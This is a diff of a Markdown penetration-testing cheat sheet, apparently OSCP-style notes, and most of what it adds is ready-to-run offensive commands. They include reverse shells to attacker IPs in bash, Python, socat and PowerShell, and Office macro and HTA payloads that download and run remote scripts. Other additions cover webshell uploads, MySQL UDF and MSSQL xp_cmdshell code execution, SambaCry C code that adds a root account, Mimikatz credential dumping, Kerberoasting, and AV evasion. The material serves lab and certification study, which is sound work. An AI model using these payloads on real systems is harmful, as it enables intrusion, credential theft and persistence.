@@ -1,23 +1,28 @@
 # My Security Resources
+- 來幫我按星星啦 Q__Q 
+    - https://github.com/stevenyu113228/My-Security-Resources
 
+---
 [TOC]
 
 ## Scan
 ### Portscan
 - nmap
+    - Static Binary
+        - https://github.com/ernw/static-toolbox/releases
     - Parameters
         - `-A` : Enable OS detection, version detection, script scanning, and traceroute
         - `-p-` : Scan all ports
         - `-p 1000-9999` : Scan port from 1000 to 9999 
+        - `-sV` : Services version
+        - `-Pn` : No ping
+        - `--script=vuln` : Scan vulnerability
+        - `-p139,445` : Only scan 139,445 port
     - Fast UDP Scan
         - `sudo nmap -sUV -T4 -F --version-intensity 0 {IP}`
 - RustScan
 	- `rustscan -a 10.10.166.15`
 	    - `-r 1-65535` : Port range from 1 to 65535
-### Services
-- enum4linux
-    - Parameters
-        - `-a` : Do all simple enumeration
 ## Web
 ### Scan
 - [Dirsearch](https://github.com/maurosoria/dirsearch)
@@ -74,6 +79,8 @@
 	- `echo passthru("whoami")`
 	- `echo shell_exec("whoami")` 
 	- `echo exec("whoami")`
+- Bypass Disable Function
+    - https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php
 - Wrapper
 	- `php://filter/convert.base64-encode/resource=meow.php`
 - Default Session Path
@@ -84,6 +91,7 @@
     sess_name = 'meowmeow'
     sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
     # sess_path = f'/var/lib/php/session/sess_{sess_name}'
+    # sess_path = f'/tmp/sess_{sess_name}'
     base_url = 'http://{target-domain}/{target-path/randylogs.php}'
     param = "file"
 
@@ -117,6 +125,12 @@
 - Webshell
     - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp
         - `jar -cvf cmd.war cmd.jsp` and upload to Tomcat admin
+- Brute force
+    - hydra : `hydra -L  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -f {IP} -s {PORT} http-get /manager/html`
+    - msf : `scanner/http/tomcat_mgr_login`
+### Werkzeug
+- Debug Page RCE
+    - https://github.com/its-arun/Werkzeug-Debug-RCE
 ### Defence
 - Knockd
 	- `/etc/knockd.conf`
@@ -144,6 +158,15 @@
     - `http://{ip}/index.php/?author=1`
 - plugins path
     - `/wp-content/plugins/{plugin_name}`
+- Password db
+    - `SELECT concat(user_login,":",user_pass) FROM wp_users;`
+- Config file (DB Pass)
+    - `wp-config.php`
+- Plugin Webshell
+    - `wget https://raw.githubusercontent.com/jckhmr/simpletools/master/wonderfulwebshell/wonderfulwebshell.php`
+    - `zip wonderfulwebshell.zip wonderfulwebshell.php`
+    - Upload and Enable
+    - `http://{doamin}/wp-content/plugins/wonderfulwebshell/wonderfulwebshell.php?cmd=ls`
 ### MySQL injection
 #### SQL Command
 - Limit
@@ -175,7 +198,9 @@
     - `select concat(user,':',password) from mysql.user`
 - Command dump
     - `mysqldump -u {username} -h localhost -p {dbname}  > a.sql`
-
+#### File
+- Write file
+    - `SELECT "meow" INTO OUTFILE "/tmp/a";`
 ### MSSQL injection
 #### SQL Command
 - `SELECT quotename({col_name}) FROM {DB} FOR XML PATH('')`
@@ -183,6 +208,7 @@
 - `SELECT TOP 1 {COL_NAME} FROM {TABLE}`
     - `SELECT TOP 1 {COL_NAME} FROM {TABLE} WHERE {COL_NAME} NOT IN ('A','B')` 
 - `SELECT {COL_NAME} FROM {DB_NAME}.dbo.{TABLE}`
+    - Select other DB
 - `CONVERT(int,{command})`
     - Error based
 #### Dump DB Name
@@ -196,9 +222,42 @@
 #### Dump Table name
 - One line 
     - `SELECT quotename(name) FROM {DB_NAME}..sysobjects where xtype='U' FOR XML PATH('')`
+- Select One Data
+    - `SELECT TOP 1 name,NULL FROM music..sysobjects where xtype='U'`
+        - `and name not in ('Table_1','Table_2')`
 #### Dump column name
 - One line
     - `SELECT quotename(name) FROM {DB_NAME}..syscolumns WHERE id=(SELECT id FROM {DB_NAME}..sysobjects WHERE name='{TABLE_NAME}') FOR XML PATH('')))) -- -`
+#### DB Admin
+- `select concat(user,',',password),NULL from master.dbo.syslogins -- -`
+### Oracle Injection
+- Union based
+    - Column counts, Data type must be same (`NULL`)
+    - Select must have `FROM`, if no item can FROM, use `dual`
+    - eg. `' UNION SELECT NULL,NULL,3 FROM dual --`
+- Current Username
+    - `SELECT USER FROM dual`
+- Dump DB (Schema) Names
+    - `SELECT DISTINCT OWNER FROM ALL_TABLES` (return multiple rows)
+- Dump Table Names
+    - All : `SELECT OWNER,TABLE_NAME FROM ALL_TABLES`
+    - Specific DB: `SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{DB_NAME}'`
+- Dump Column Names
+    - `SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{TABLE_NAME}'`
+- Select data
+    - `SELECT {Col1},{Col2} FROM {Table}`
+- Select One line using ROWNUM (Doesn't support limit)
+    - eg. `SELECT NULL,COLUMN_NAME,3 FROM (SELECT ROWNUM no, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='WEB_ADMINS') where no=1 -- ` 
+        - no=1 2 3 ...
+### SQLite Injection
+- Version
+    - `sqlite_version()`
+- Table
+    - `select name from sqlite_master WHERE type='table'`
+- Column
+    - `select sql from sqlite_master WHERE type='table'`
+- Data
+    - `select {Column} from {Table}`
 ## Client Side Attack
 ### Office Macro
 - File type : `docm` or `doc`, doesn't support `docx`
@@ -218,6 +277,17 @@
     ```
     - cmd path will at `system32`
     - shell : `str = powershell iex (New-Object Net.WebClient).DownloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}`
+- Reverse shell 1
+    - `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=443 -e x86/shikata_ga_nai -f vba > shell.vba`
+        - First Half to macro
+        - Second Half to word doc
+- Reverse shell 2 (macro_pack)
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.247 LPORT=443 -e x86/shikata_ga_nai -f vba > shell.vba`
+    - [macro_pack](https://github.com/sevagas/macro_pack)
+    - `macro_pack.exe -f shell.vba -o -G meow.doc`
+### HTA (HTML Application)
+- VBS RCE
+    - ` <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.119.132/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.132 -Port 53"</scRipt>`
 ## Shell
 ### Linux Shell
 - Find File
@@ -227,6 +297,8 @@
 ### Windows Shell
 - List all data
 	- `dir /a`
+- Short name
+	- `dir /x` 
 - Find File
     - `dir {file_name} /s /p`
 ### Reverse Shell - Linux
@@ -241,13 +313,35 @@
     - `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
     	- Write file in local first, and use wget/curl to get to victim machine
     	- `/usr/bin/wget -O - {ip:port}/{file} | /bin/bash`
+    - `bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261%27`
+- Python
+    - `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' &`
 - Make it more interactively
     - `python -c 'import pty; pty.spawn("/bin/bash")'`
     - `perl -e 'exec "/bin/bash";'`
+- Full shell (Can use vim)
+    - `bash` (Zsh doesn't support)
+    - `nc -nlvp 443` (Open Port to listening, and wait shell to conect)
+    - `python -c 'import pty; pty.spawn("/bin/bash")'` (Spawn shell)
+    - Ctrl + Z
+    - `stty raw -echo`
+    - `fg` (Will not show)
+    - `reset`
+    - Enter , Enter
+    - Ctrl + C
+    - `export SHELL=bash`
+    - `export TERM=xterm-256color`
+    - `stty rows 38 columns 116`
+- js Shell Code
+    - `
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={Port} CMD=/bin/bash -f js_le -e generic/none`
+- [socat](https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.1/socat-1.7.4.1-x86)
+    - Server : ```socat file:`tty`,raw,echo=0 tcp-listen:{PORT}```
+    - Client : `./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}`
 ### Reverse Shell - Windows
 - msfvenom
 	- https://infinitelogins.com/2020/01/25/sfvenom-reverse-shell-payload-cheatsheet/
-	    - stage : `shell/reverse_tcp `
+	    - stage : `shell/reverse_tcp`
 	        - msf `multi/handler` to receive
 	    - stageless : `shell_reverse_tcp`
 	        - `nc` to receive
@@ -265,9 +359,10 @@
             - Install by `msiexec /quiet /i shellx64.msi`
 
 - Powershell
-	- https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+	- [Invoke-PowerShellTcp](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
 	- `powershell iex (New-Object Net.WebClient).DownloadString('http://{my_ip}:{http_port}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {my_ip} -Port {shell_port}`
-
+    - [mini-reverse.ps1](https://gist.github.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/f4283f758fb720c2fe263b8f7696b896c9984fcf/mini-reverse.ps1)
+        - `powershell IEX (New-Object Net.WebClient).DownloadString('http://10.1.1.246/mini-reverse.ps1')`
 ### File Transmission - Linux
 - SCP
 - HTTP
@@ -283,6 +378,8 @@
 	- Send
 		- `nc {attacker_ip} {attacker_port} < {file}`
 		- `cat {file} > /dev/tcp/{ip}/{port}`
+- FTP
+    - `python3 -m pyftpdlib -p 21 -w`
 ### File Transmission - Windows
 - HTTP
 	- Prepare
@@ -320,12 +417,51 @@
 		- Write web shell
 	- `save`
 		- Save file
+### MySQL
+#### Exploit
+- User-Defined Function (UDF) Dynamic Library
+    - `SHOW VARIABLES LIKE 'plugin_dir';`
+        - Check plugin dir
+    - Write File Method (1)
+        - `use mysql;`
+        - `create table hack(line blob);`
+        - `insert into hack values(load_file('/tmp/lib_sys_udf.so'));`
+            - File From https://github.com/zinzloun/MySQL-UDF-PrivEsc (https://www.exploit-db.com/exploits/1518)
+        - `select * from hack into dumpfile '/{plugin_dir}/lib_sys_udf.so';`
+    - Write File Method (2)
+        - `xxd -p -c 9999999 lib_sys_udf.so`
+        - `SET @SHELL=0x{.....}`
+        - `SHOW VARIABLES LIKE 'plugin_dir';`
+        - `SELECT BINARY @SHELL INTO DUMPFILE '{PLUGIN_DIR}/meow.so';`
+    - `create function do_system returns integer soname 'lib_sys_udf.so';`
+    - `select do_system("{Bash script}");`
+        - Not show return 
 ### MSSQL
 - Connect
 	- `impacket-mssqlclient -p {port} {UserID}@{IP} -windows-auth`
 	- Default port : 1433
 - Shell
 	- `exec xp_cmdshell '{Command}'`
+	    - `exec xp_cmdshell '\\192.168.119.210\meow\s443.exe'`
+	        - `exec` doesn't need escape character
+            - `xp_cmdshell(net users)`
+                - Can also work but can't `\`
+	- If no permission
+        ```
+        EXEC sp_configure 'show advanced options',1
+        RECONFIGURE 
+        EXEC sp_configure 'xp_cmdshell',1
+        RECONFIGURE
+        ```
+#### Backup
+- `C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup/master.mdf`
+    - Or short path `C:/PROGRA~1/MICROS~1/MSSQL1~1.SQL/MSSQL/Backup/master.mdf`
+- [Invoke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)
+    - `Add-Type -Path 'OrcaMDF.RawCore.dll'`
+    - `Add-Type -Path 'OrcaMDF.Framework.dll'`
+    - `import-module .\Get-MDFHashes.ps1`
+    - `Get-MDFHashes -mdf "C:\Users\Administrator\Desktop\master.mdf" | Format-List`
+    - Use john
 ### Oracle
 - Default Port 1521
 - Check version
@@ -333,12 +469,15 @@
 - Brute Force SID
     - `hydra -L sids-oracle.txt -s 1521 {IP} oracle-sid`
     - [oracle-sid.txt](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-LcreDSG0Hi8mv8n8DIw%2F-LcrnYv40ILvFrpjKRkb%2Fsids-oracle.txt?alt=media&token=8206a9f6-af86-4a49-ac71-179ca973d836)
+    - `odat sidguesser -s "{IP}" -p 1521`
 - Connection
     - `tnscmd10g status --10G -p {port} -h {IP}`
 - [ODAT](https://github.com/quentinhardy/odat/releases)
 - Brute Force Username and Password
     - `./odat all -s {IP} -p {PORT} -d {SID}`
-    - `--accounts-file` , `--accounts-files`
+        - `--accounts-file` 
+    - `patator oracle_login sid={SID} host={IP} user=FILE0 password=FILE1 0=~/Wordlist/users-oracle.txt 1=~/Wordlist/pass-oracle.txt`
+    - `odat all -s 10.11.1.222 -p 1521 -d XEXDB`
 - RCE
     - `odat-libc2.12-x86_64 ./odat-libc2.12-x86_64 dbmsscheduler -U {Username} -P {Password} -d {SID} -s {IP} --sysdba --exec "{command}" `
 ### SMB
@@ -348,30 +487,77 @@
     - `impacket-psexec {username}:{password}'@{ip}`
 - Check version
     - `nmap -p139,445 --script smb-os-discovery -Pn {IP}`
-- Check vuln
-    - `nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 -Pn {IP}`
+    - Open Wireshark
+        - `smbclient -N -L "//{IP}/" --option='client min protocol=nt1'`
+    - msf
+        - `scanner/smb/smb_version`
+- CVE-2017-7494 SambaCry , linux/samba/is_known_pipename
+    - Check vuln
+        - `nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 -Pn {IP}`
+    - Check share dir
+        - `nmap --script=smb-enum-shares -p445 -Pn {IP}`
+    - https://github.com/joxeankoret/CVE-2017-7494
+        - `python2 cve_2017_7494.py -t 10.11.1.146 --custom command.so`
+    - `gcc -o command.so -shared command.c -fPIC`
+        - ```C=
+          #include <stdio.h>
+          #include <unistd.h>
+          #include <netinet/in.h>
+          #include <sys/types.h>
+          #include <sys/socket.h>
+          #include <stdlib.h>
+          #include <sys/stat.h>
+          int samba_init_module(void)
+            {
+              setresuid(0,0,0); 
+              system("echo root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash >> /etc/passwd");
+              return 0;
+            }
+          ```
+- List user
+    - `nmap --script smb-enum-users.nse -p445 {IP}`
 - Low Version
     - `--option='client min protocol=nt1'`
         - If got `NT_STATUS_CONNECTION_DISCONNECTED`
 - Symlink Directory Traversal ( < 3.4.5)
     - Tested on 3.0.24
     - https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually
-
-
-### PostgreSQL
+- Samba 2.2.x - Remote Buffer Overflow
+    - Tested on 2.2.7a
+    - https://www.exploit-db.com/exploits/7
+- Scan
+    - `python3 enum4linux-ng.py -A {IP}`
+### Pop3
+- `nmap -Pn --script "pop3-capabilities or pop3-ntlm-info" -sV -p{PORT}`
 - Dump
     - `PGPASSWORD="{PASSWORD}" pg_dump {DB_NAME} > test.dump`
+### FTP
+- Home FTP
+    - [Home FTP Server 1.12 - Directory Traversal](https://www.exploit-db.com/exploits/16259)
+    - [Home FTP File Download](https://webcache.googleusercontent.com/search?q=cache:92M05_e2PYcJ:https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/0911-exploits/homeftpserver-traversal.txt+&cd=4&hl=zh-TW&ct=clnk&gl=tw&client=firefox-b-d)
+- FileZilla
+    - Default password location
+        - `C:\Program Files\FileZilla Server\FileZilla Server.xml`
+        - maybe `(x86)`
+- WINRM (5985 port)
+    - `sudo gem install evil-winrm`
+    - `evil-winrm -t {IP} -u {User} -p {pass}`
+### RDP
+- Enable
+    - `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
+    - `netsh advfirewall firewall set rule group="remote desktop" new enable=yes`
+- Add User To RDP Group
+    - `net localgroup "Remote Desktop Users" "User name" /add`
 ## Privilege - Linux
 ### Kernel Exploit
 - [CVE-2017-16995](https://github.com/rlarabee/exploits/tree/master/cve-2017-16995)
-    - Test on Kernel 4.4.0
+    - Test on Kernel 4.4.0 (4.4.0-116-generic)
     - `gcc cve-2017-16995.c -o cve-2017-16995`
 - [CVE-2012-0056 (memodipper)](https://github.com/lucyoa/kernel-exploits/blob/master/memodipper/memodipper.c)
     - `gcc memodipper.c -o m.out`
 - [CVE-2010-2959 (i-can-haz-modharden)](https://raw.githubusercontent.com/macubergeek/ctf/master/privilege%20escalation/i-can-haz-modharden.c)
 - Compile for old OS
     - `gcc -m32 ./{INPUT.c) -o {OUTPUT} -Wl,--hash-style=both`
-    - 
 ### Software
 - [GTFOBins](https://gtfobins.github.io/)
     - Linux privileges escalation 
@@ -388,6 +574,10 @@ Scan the system to find which can be use for privileges escalation
     - Append `root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash` to file
         - `root1` : `meow`
     - Generate hash : `openssl passwd {PASSWORD}`
+- Add User
+    - `useradd -p $(openssl passwd -1 meow) root1`
+- Add to sudo group
+    - `usermod -aG sudo root1`
 ### Program Hijack
 #### Python
 - import library priority
@@ -404,7 +594,17 @@ Scan the system to find which can be use for privileges escalation
 	- We can modify this by
 		- `PATH=/my/fake/path:$PATH ./binary`
 	- Fake path can contain the shell/reverse shell command file
-
+### IP Tables
+- Clear all rull
+```bash
+iptables -P INPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+iptables -F
+iptables -X
+```
+- Check open port
+    - `netstat -tulpn | grep LISTEN`
 ### Program
 - `tar` Wildcard
 	- `echo "bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'" > shell.sh`
@@ -433,6 +633,7 @@ Scan the system to find which can be use for privileges escalation
 - `/.dockerenv`
 	- If exist, probably in docker 
 - Notice mount point
+- Mount data `/proc/1/mountinfo` (LFI can read)
 ### SOP
 - Check `sudo -l`
 	- What file we can run as super user 
@@ -448,6 +649,8 @@ Scan the system to find which can be use for privileges escalation
 	- [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
 		- sudo < 1.8.28
 		- `sudo -u#-1 binary`
+    - [CVE-2010-0426](https://github.com/t0kx/privesc-CVE-2010-0426) Sudo 1.6.x <= 1.6.9p21 and 1.7.x <= 1.7.2p4
+        - sudoedit 
 - Check $PATH / import library permission
 	- Program Hijack
 - Check capability
@@ -455,12 +658,18 @@ Scan the system to find which can be use for privileges escalation
 	- Check if the program has some useful capability
 - Check backup file
 ## Privilege - Windows
+### XP
+- [Windows XP SP0/SP1 Privilege Escalation to System](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
 ### Exploit
 - https://github.com/SecWiki/windows-kernel-exploits
 - [EternalBlue MS17-010](https://github.com/helviojunior/MS17-010)
     - Prepare msf reverse shell exe
     - run `send_and_execute.py` 
-        - Maybe need to change username to `guest` 
+        - Maybe need to change username to `guest`
+    - If can't reply some port
+        - use `zzz_exploit.py` , change `smb_pwn`  function 
+        - `service_exec(conn,r'cmd /c net user /add meow Me0www')` 
+        - `service_exec(conn,r'cmd /c net localgroup administrators meow /add')`
 - [Cerrudo](https://github.com/Re4son/Churrasco)
     - Windows Server 2003
 - [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip)
@@ -471,6 +680,11 @@ Scan the system to find which can be use for privileges escalation
         - `-c` (Include curly brackets)
             - CLSID from https://ohpe.it/juicy-potato/CLSID/
         - `-p` Exe Program 
+        - Not work for Windows Server 2019 and Windows 10 versions 1809 and higher.
+- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
+    - Windows Server 2019 and Windows10
+    - `SeImpersonatePrivilege` Enable 
+    - `PrintSpoofer.exe -i -c cmd`
 - [XP SP0 \~ SP1](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
     -  `net start SSDPSRV`
     -  `sc config SSDPSRV start= auto`
@@ -492,7 +706,9 @@ Scan the system to find which can be use for privileges escalation
         - `msiexec /quiet /i shellx64.msi`
     - But need to check where can install (AppLocker)
         - `Get-AppLockerOolicy -Effective | Select -Expandproperty RuleCollections`
-
+- Auto login
+    - `reg query HKCU\Software\Microsoft\Windows NT\Currentversion\WinLogon /v DefaultUserName`
+    - `reg query HKCU\Software\Microsoft\Windows NT\Currentversion\WinLogon /v DefaultPassword`
 ### Defender / Firewall
 - 64 bit Powershell
 	- `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`
@@ -526,12 +742,20 @@ Scan the system to find which can be use for privileges escalation
     - Desktop
     - Document
     - Download
+- `C:\Windows\System32\drivers\etc\hosts`
 ### Process
 - `netstat -ano`
     - Open Port
     - `netstat -an | findstr "LISTENING"`
 - `tasklist`
     - like ps
+    - `/v` : list user
+### Services
+- Query Services
+    - `sc qc {Services Name}`
+    - Can get the services user
+- Get all services
+    - `wmic service get name,pathname`
 ### Permission
 - `icacls`
     - Check permission
@@ -560,6 +784,12 @@ Scan the system to find which can be use for privileges escalation
 - List group
     - `net group`
     - `net group /domain`
+- http://md.stevenyu.tw/zeDGpHb-RVSi0K5xF1HRsQ
+#### Kerberoast
+- Get User Hash
+    - [Invoke-Kerberoast.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
+    - `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://{MY_IP}/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"`
+    - `hashcat -m 13100 `
 ### Get User's hash
 - `impacket-smbserver`
     - `dir \\{ip}\meow`
@@ -572,10 +802,26 @@ Scan the system to find which can be use for privileges escalation
     - `fgdump.exe` (`locate fgdump.exe`)
         - Send to windows and just run
         - It will create a `127.0.0.1.pwdump` hash file
+    - `hashcat -m 1000`
+- [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)
+    - `privilege::debug`
+    - `sekurlsa::logonPasswords full`
+        - Dump current computer passwords
+    - `lsadump::dcsync /domain:{DOMAIN NAME} /all /csv`
+        - Dump domain user hash (need domain admin)
+    - `mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"`
 ### Powershell
 - If got `cannot be loaded because running scripts is disabled on this system`
     - type `Set-ExecutionPolicy RemoteSigned`
-
+### Defense Evasion
+- Shellter
+    - Auto Mode : A
+    - PE Target : `{whoami.exe}`
+    - Stealth mode : N
+    - Custom : C
+    - Payload : `{raw_file}`
+        - `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f raw > {FILE}.raw`
+    - DLL Loader : N
 
 ## Password Crack
 ### Software
@@ -585,8 +831,10 @@ Scan the system to find which can be use for privileges escalation
     - Usage
         - ssh
             - `hydra -l {username} -P {path_to_wordlist} ssh://{ip_address}`
-        - http{s}
+        - http{s} Post
             - `hydra -l {username} -P {path_to_wordlist} {domain_name_without http/s} http{s}-post-form "{/{path}}:username=^USER^&password=^PASS^&data=data:{string_if_fail}"`
+        - ftp
+            - `hydra -l {username} -P {wordlist} ftp://{IP}`
 - John the ripper
     - Crack hash like `/etc/shadow`
     - Support tools
@@ -609,14 +857,19 @@ Scan the system to find which can be use for privileges escalation
 - Apache Tomcat
     - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
     - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`
-    - `hydra -L  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -f {IP} -s {PORT} http-get /manager/html`
+
+- Generate Wordlist
+    - Cewl
+        - `cewl http://{IP}/{PATH} | tee wordlist.txt`
 ### Online
 - https://crackstation.net/
+- https://hashes.com/en/decrypt/hash
 
 ## Software
 - RDP
-	- `xfreerdp +drives /u:{username} /v:{ip}:{port}`
+	- `xfreerdp +drives /u:{username} /p:{password} /v:{ip}:{port}`
 	    - `/size:1800x1000`
+	    - `/u:{domain\username}`
 - FTP
 	- `ls`
 	- `get {file_name}`
@@ -628,20 +881,30 @@ Scan the system to find which can be use for privileges escalation
         - `gunzip  {filename.gz}`
 - tcpdump
     - Recv icmp : `sudo tcpdump -i tun0 icmp`
-### Reverse port forwarding
+### Reverse tunnel forwarding
+- https://book.hacktricks.xyz/tunneling-and-port-forwarding
 - [Chisel](https://github.com/jpillora/chisel) 
-    - Server : `./chisel server -p {listen_port} --reverse`
-        - listen port can be random
-    - Client : `./chisel client {Remote_host}:{listen_port} R:{forward_port_at_attacker}:127.0.0.1:{forward_port}`
-    - eg. : Remote server run a program at `127.0.0.1:8888`,we need to forward to our attack machine's `127.0.0.1:8888`
-        - `./chisel server -p 9999 --reverse`
-        - `./chisel client 10.10.16.35:9999 R:8888:127.0.0.1:8888`
+    - Port
+        - Server : `./chisel server -p {listen_port} --reverse`
+            - listen port can be random
+        - Client : `./chisel client {Remote_host}:{listen_port} R:{forward_port_at_attacker}:127.0.0.1:{forward_port}`
+        - eg. : Remote server run a program at `127.0.0.1:8888`,we need to forward to our attack machine's `127.0.0.1:8888`
+            - `./chisel server -p 9999 --reverse`
+            - `./chisel client 10.10.16.35:9999 R:8888:127.0.0.1:8888`
+    - Proxy
+        - Server `./chisel server -p {listen_port} --reverse`
+        - Client `./chisel client {Remote_host}:{listen_port} R:socks`
+        - Default proxy port : 1080
+            - Set `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf` or firefox proxy
 - SSH
-    - `ssh -L {forward_port}:127.0.0.1:{forward_port} {remote_user}@{remote_ip} -p {ssh_port} -N -v -v`
-        - Run in local
-        - eg : Remote `10.87.87.87` run `5555` in remote local, open `2222` port for ssh, we can use following command to forward `5555` to our local `5555`
-            - `ssh -L 5555:127.0.0.1:5555 demo@10.87.87.87 -p 2222 -N -v -v`
-
+    - Port Forwarding
+        - `ssh -L {forward_port}:127.0.0.1:{forward_port} {remote_user}@{remote_ip} -p {ssh_port} -N -v -v`
+            - Run in local
+            - eg : Remote `10.87.87.87` run `5555` in remote local, open `2222` port for ssh, we can use following command to forward `5555` to our local `5555`
+                - `ssh -L 5555:127.0.0.1:5555 demo@10.87.87.87 -p 2222 -N -v -v`
+    - Proxy
+        - `ssh -D 127.0.0.1:{PORT} {USER}@{IP}`
+        - socks4, can set to proxychains
 ## Forensics
 - Unknown files
 	- `file {file_name}`
@@ -657,6 +920,6 @@ Scan the system to find which can be use for privileges escalation
 	- `steghide extract -sf {file_name}`
 - exiftool
 
-<!-- todo
-
+<!-- TODO:
+https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html
 -->
